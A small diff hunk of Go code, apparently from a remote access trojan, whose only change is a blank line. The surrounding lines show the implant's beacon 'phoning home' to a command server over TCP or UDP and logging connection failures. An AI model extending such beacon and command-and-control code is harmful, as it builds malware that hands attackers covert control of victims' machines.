@@ -81,6 +81,7 @@ func main() {
 			if derp != nil {
 				ErrorHandling.RatLogError(derp, "[-] Beacon TCP failed to connect to command, stopping beacon")
 			}
+
 		case "udp":
 			udp_conn, derp := Beacons.BeaconUDP(Core.PHONEHOME_UDP)
 			if derp != nil {
